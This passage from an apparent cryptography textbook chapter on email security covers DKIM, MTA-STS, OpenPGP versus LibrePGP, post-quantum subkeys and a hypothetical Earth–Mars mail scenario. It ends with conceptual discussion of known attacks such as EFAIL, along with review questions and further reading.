rotate their DKIM keys regularly and **publish the old private keys**, so that
signatures stay useful for delivery but stop proving anything afterwards: the
same deniability argument as in Signal. Few providers have done so.

**Mail in transit.** Separately from all of this, mail servers encrypt the
hops between them with TLS, using STARTTLS: an upgrade from plain SMTP that
an attacker in the middle can strip. MTA-STS (RFC 8461, 2018) and DANE for
SMTP (RFC 7672, 2015, with DNSSEC; Chapter 10) let a domain say "always use
TLS to reach me, with this certificate". This protects mail on the wire, not
on the servers.

## 15.9 Mars: mail across the gap

*Level: intermediate.*

Mail is the natural medium between Earth and Mars. A one-way light delay of
about 3 to 22 minutes, and a blackout of about two weeks around solar conjunction
every 26 months, make interactive protocols painful; store-and-forward is
how a Mars link works anyway (the Delay-Tolerant Networking of Chapter 20).
Encrypting a letter needs no round trip, so OpenPGP and S/MIME are, for once,
the right shape. The difficulties are the ones around the encryption.

<figure class="mars-fig">
<svg viewBox="0 0 640 290" width="640" role="img" aria-label="Mail between Arcadia City on Mars and Earth: messages are encrypted to keys exchanged before departure, carried store-and-forward through relay orbiters with a 3 to 22 minute delay, and checked against local mirrors of the other planet's DNS and key directories" fill="currentColor" font-size="13">
<circle cx="80" cy="110" r="52" class="soft" stroke="currentColor"/>
<text x="80" y="106" text-anchor="middle" font-weight="bold">Earth</text>
<text x="80" y="124" text-anchor="middle" font-size="11.5">mission control</text>
<circle cx="560" cy="110" r="40" class="soft-acc" stroke="currentColor"/>
<text x="560" y="106" text-anchor="middle" font-weight="bold">Mars</text>
<text x="560" y="124" text-anchor="middle" font-size="11.5">Arcadia City</text>
<line x1="136" y1="110" x2="248" y2="110" stroke="currentColor" stroke-dasharray="6 5"/><line x1="392" y1="110" x2="516" y2="110" stroke="currentColor" stroke-dasharray="6 5"/>
<polygon points="518,110 506,105 506,115"/><polygon points="134,110 146,105 146,115"/>
<rect x="250" y="88" width="140" height="44" rx="6" class="soft" stroke="currentColor"/>
<text x="320" y="107" text-anchor="middle" font-size="12">relay orbiters</text>
<text x="320" y="123" text-anchor="middle" font-size="11.5">store and forward</text>
<text x="320" y="78" text-anchor="middle" font-size="12">3 to 22 minutes one way</text>
<rect x="20" y="180" width="290" height="96" rx="6" stroke="currentColor" fill="none"/>
<text x="36" y="200" font-size="12" font-weight="bold">Before departure</text>
<text x="36" y="220" font-size="12">exchange certificates, check fingerprints</text>
<text x="36" y="240" font-size="12">in person; post-quantum hybrid subkeys</text>
<text x="36" y="260" font-size="12">(ML-KEM-768 + X25519, RFC 9980)</text>
<rect x="330" y="180" width="290" height="96" rx="6" stroke="currentColor" fill="none"/>
<text x="346" y="200" font-size="12" font-weight="bold">On Mars</text>
<text x="346" y="220" font-size="12">local mirror of Earth's key directories</text>
<text x="346" y="240" font-size="12">and DNSSEC-signed DKIM records;</text>
<text x="346" y="260" font-size="12">monthly subkeys, old ones deleted</text>
</svg>
<figcaption>Figure 15.5. Mail between planets. Encryption needs no round trip; key discovery and revocation do, so they are moved ahead in time.</figcaption>
</figure>

**Key discovery in advance.** Looking up a key on Earth takes a light round
trip, 6 to 44 minutes, and fails during conjunction. Arcadia City keeps a
mirror of the Earth key directories it needs (WKD files and DNS records,
DNSSEC-signed so the mirror cannot alter them, Chapter 10), refreshed with
every downlink. Crews exchange certificates and verify fingerprints in person
before departure, the one time a key-signing party is the easy option.

**Revocation is slow.** If a settler's laptop is stolen, a revocation
certificate (a signature of type 0x20) takes at least the light time to reach
Earth, and Earth senders keep encrypting to the old key until it arrives.
Short-lived encryption subkeys bound the damage: with a new subkey each
month, signed by a primary key kept offline, a stolen subkey reads at most a
month of mail.

**Forward secrecy by deletion.** Rotating subkeys and deleting the old secret
parts once their mail is read gives a coarse forward secrecy: an attacker who
later seizes the laptop finds no key for last year's mail. (The mail itself
must be stored re-encrypted under a local storage key, Chapter 18, or the
archive defeats the point.)

**Decades-long secrets.** Mission data, medical records and private letters
between planets will be archived for decades, exactly the "harvest now,
decrypt later" case. RFC 9980 (2026) pairs ML-KEM-768 with X25519 in an
OpenPGP encryption subkey, so a message stays safe if either holds; S/MIME
has ML-KEM recipients (RFC 9936). For mail that must stay secret into the
2060s, both are worth their extra bytes: an ML-KEM-768 ciphertext is 1,088
bytes per recipient, nothing next to a photo attachment.

**DKIM across the gap.** A Mars mail server that receives mail signed by
`nasa.gov` cannot fetch the DKIM key live; it checks against the mirrored,
DNSSEC-signed records. Mail that arrives signed with a key rotated after the
last mirror refresh is held, not rejected, until the next update.

## 15.10 In the real world

*Level: intermediate.*

**The OpenPGP split.** RFC 9580, the "crypto refresh" of OpenPGP, was
published in July 2024 after years of work in the IETF working group. GnuPG,
the most widely installed implementation, did not adopt it. Its author,
Werner Koch, disagreed with the direction the working group took and
continues an earlier draft design as **LibrePGP**, an individual draft with
no IETF standing. The two new formats do not read each other's messages:

| | RFC 9580 | LibrePGP (GnuPG) |
|---|---|---|
| New key version | v6, SHA-256 fingerprint | v5, SHA-256 fingerprint |
| Ed25519 / X25519 | own algorithm IDs, 27 and 25 | EdDSA (22) and ECDH (18) on Curve25519, as on v4 keys |
| AEAD container | v2 SEIPD (packet 18), OCB required | OCB Encrypted Data (packet 20) |
| Post-quantum | RFC 9980 hybrids | Kyber paired with an ECC key |
| Who | Sequoia, OpenPGP.js (v6) | GnuPG |

Both still read and write v4 keys and v1 SEIPD (CFB with the SHA-1 MDC),
which is what most users have and what interoperates. GnuPG's default key is
still a v4 Ed25519 primary key with a Curve25519 encryption subkey.

**Algorithms.** RFC 9580 requires Ed25519, X25519, AES-128, OCB and SHA-256,
recommends Argon2 for passphrases, forbids creating data without integrity
protection, and retires IDEA, 3DES and CAST5 for encryption, DSA entirely,
and MD5, SHA-1 and RIPEMD-160 for new signatures. S/MIME 4.0 requires
AES-GCM, ECDSA on P-256 and Ed25519 to verify, SHA-256 and RSA-OAEP as a
SHOULD+; PKCS#1 v1.5 key transport is a MUST- on its way out.

**Post-quantum.** RFC 9980 (June 2026) adds ML-KEM-768+X25519 (required) and
ML-KEM-1024+X448 for encryption, and ML-DSA-65+Ed25519 (required),
ML-DSA-87+Ed448 and SLH-DSA for signatures, as v6 keys; the
[KEMs and signatures](../post-quantum/03-KEMs-and-Signatures.md) chapter of
the Post-quantum book explains the building blocks. CMS uses ML-KEM and
ML-DSA alone, not in pairs.

**Where you meet it.** Software signatures (apt, RPM, git tags, release
files), Proton Mail and other services that wrap OpenPGP, company S/MIME in
Outlook and Apple Mail, and, almost invisibly, DKIM on nearly every message
you receive: Gmail and Yahoo have required SPF, DKIM and DMARC from bulk
senders since February 2024.

**Common failures.** Encrypting to an expired or revoked key from a stale
copy; signing the plaintext and encrypting, so the recipient can re-encrypt
the signed message to someone else (§15.11); replying in plain text with the
encrypted message quoted below; keeping the subject line secret in the body
but not in the header.

## 15.11 Going deeper

*Level: expert.*

**Sign and encrypt is not enough.** Don Davis showed in "Defective Sign &
Encrypt in S/MIME, PKCS#7, MOSS, PEM, PGP, and XML" (USENIX Annual Technical
Conference, 2001) that the naive composition is weak. If Alice signs "the
deal is off" and encrypts it to Bob, Bob can decrypt and re-encrypt Alice's
signed message to Carol, who sees a valid message from Alice addressed to
nobody in particular: **surreptitious forwarding**. If Alice encrypts first
and signs the ciphertext, anyone can strip her signature and sign it
themselves. The fixes bind the recipient into the signature or the sender
into the encryption. OpenPGP v6 added an "intended recipient fingerprint"
subpacket for this; S/MIME relies on the signed headers being inside, which
header protection (RFC 9788) finally makes reliable.

**Key commitment and multi-recipient messages.** A message encrypted to Bob
and Carol carries the same session key for both. AEAD modes such as GCM and
OCB are not **key-committing**: a ciphertext can be built that decrypts
validly under two different keys to two different messages. In a
multi-recipient format a malicious sender could show Bob and Carol different
content under one signature, unless the signature is inside and covers the
plaintext. Research on "invisible salamanders" (Dodis, Grubbs, Ristenpart and
Woodage, CRYPTO 2018, about Facebook's message franking) made this concrete.

**Forward-secret mail.** Proposals to give mail forward secrecy range from
short-lived subkeys (§15.9) to puncturable encryption, where a key can be
updated so that it no longer decrypts one particular ciphertext but still
decrypts all others (Green and Miers, IEEE S&P 2015). None is deployed in
mail; Signal's prekeys (Chapter 16) are the practical version for a different
medium.

**The client is part of the protocol.** EFAIL's authors went on to attack
the other half: in "Johnny, You Are Fired!" (USENIX Security 2019), Jens
Müller and colleagues made a large share of the mail clients they tested
show forged OpenPGP and S/MIME signatures as valid, by abusing how the
clients displayed signed parts, mixed signed and unsigned content, or
reported which key had signed. The cryptography was sound; the display
was not. A formal model of a mail format must include what the reader is
shown, which is part of what Chapter 20 means by modelling a protocol.

## Check yourself

??? question "1. Why can't OpenPGP or S/MIME give forward secrecy the way TLS does?"
    There is no live exchange. The sender must encrypt to a key the
    recipient published in advance and kept, so that key opens every message
    sent to it. Rotating and deleting subkeys gives only a coarse version.

??? question "2. What is hashed to make a v6 fingerprint, and what for a v4 one?"
    v6: SHA-256 of 0x9b, a 4-byte length and the key packet body. v4: SHA-1
    of 0x99, a 2-byte length and the body.

??? question "3. What does the 32-byte salt in a v6 signature protect against?"
    Chosen-prefix collision attacks: the attacker cannot predict the start of
    the hashed data, so they cannot prepare two documents with the same hash
    for the signer to sign one of them.

??? question "4. Why is the session key encrypted separately to every recipient instead of encrypting the message several times?"
    The message is encrypted once with a random session key; each recipient
    gets a small packet with that key encrypted to their own public key. This
    keeps the size proportional to the message plus a small cost per reader.

??? question "5. Why does SEIPD v2 split data into chunks, and what does the final tag add?"
    So that a streaming reader can release each chunk only after its own tag
    checks, never unauthenticated plaintext. The final tag, over the total
    length, detects chunks removed from the end.

??? question "6. What made the SKS keyserver network vulnerable to certificate flooding?"
    Anyone could attach certifications to any key, and the network never
    deleted anything, so junk certifications spread to every server and to
    every client that fetched the key.

??? question "7. Explain the CBC gadget used by EFAIL."
    Since $P_0 = D_K(C_0) \oplus IV$, knowing $P_0$ gives $D_K(C_0)$. Putting
    $IV \oplus P_0 \oplus X$ in front of $C_0$ makes that block decrypt to
    any chosen $X$. Repeating it writes HTML that sends the rest of the
    decrypted message to the attacker.

??? question "8. What does DKIM prove, and what doesn't it?"
    That a server holding the domain's private key sent the message with
    these headers and body (in canonical form). It says nothing about which
    person wrote it, and does not encrypt anything.

??? question "9. Why does listing `from` twice in `h=` help when only one From header is present?"
    The second, absent instance is signed as empty. An attacker who adds a
    second From header fills it, which changes the signed data and breaks the
    signature.

??? question "10. What changes about key discovery for mail between Earth and Mars?"
    A live lookup costs a light round trip and fails during conjunction, so
    keys, WKD files and DNSSEC-signed DKIM records are mirrored in advance,
    and certificates are exchanged before departure.

## What you learned

- Mail is store-and-forward: encryption is to a long-lived key published in
  advance, with no negotiation and no forward secrecy, and the headers stay
  visible.
- OpenPGP data is a sequence of packets. A certificate binds subkeys and user
  IDs to a primary key with self-signatures; v6 keys have SHA-256
  fingerprints and salted signatures. You checked RFC 9580's sample with
  Ed25519 written out.
- A message is encrypted once under a session key, which each reader gets in
  its own PKESK packet. You decrypted RFC 9580's sample with X25519, HKDF,
  AES key wrap and OCB, chunk tags and a final tag included.
- The web of trust never reached ordinary users, and append-only keyservers
  were poisoned in 2019; email-verified directories, WKD and Autocrypt
  replaced them. S/MIME uses CA-issued X.509 certificates and CMS.
- EFAIL turned CBC and CFB malleability and HTML rendering into plaintext
  theft; the fixes are AEAD, never releasing unauthenticated plaintext, and
  isolating decrypted parts.
- End-to-end encrypted mail stays rare for structural reasons; OpenPGP's
  lasting role is software signing.
- SPF, DKIM and DMARC let a domain sign and authorize its mail. You verified
  RFC 8463's Ed25519 and RSA DKIM signatures.
- Between planets, mail is the right shape; key discovery, revocation and
  post-quantum protection must be planned ahead.

## Further reading

- RFC 9580, *OpenPGP*, 2024, especially §5.13 (SEIPD) and Appendix A (the
  samples used here); RFC 9980, *Post-Quantum Cryptography in OpenPGP*, 2026.
- RFC 8551 and RFC 8550, *S/MIME Version 4.0*, 2019; RFC 5652, *Cryptographic
  Message Syntax*, 2009.
- RFC 7253, *The OCB Authenticated-Encryption Algorithm*, 2014; RFC 3394, *AES
  Key Wrap Algorithm*, 2002.
- Damian Poddebniak et al., "Efail: Breaking S/MIME and OpenPGP Email
  Encryption using Exfiltration Channels", USENIX Security 2018.
- Alma Whitten and J. D. Tygar, "Why Johnny Can't Encrypt", USENIX Security
  1999.
- Don Davis, "Defective Sign & Encrypt in S/MIME, PKCS#7, MOSS, PEM, PGP, and
  XML", USENIX 2001.
- Latacora, "The PGP Problem", 2019.
- RFC 6376 (DKIM), RFC 8463 (Ed25519 for DKIM), RFC 8301 (key sizes), RFC 7208
  (SPF), RFC 7489 (DMARC), RFC 8461 (MTA-STS).
- Philip Zimmermann, *The Official PGP User's Guide*, MIT Press, 1995.
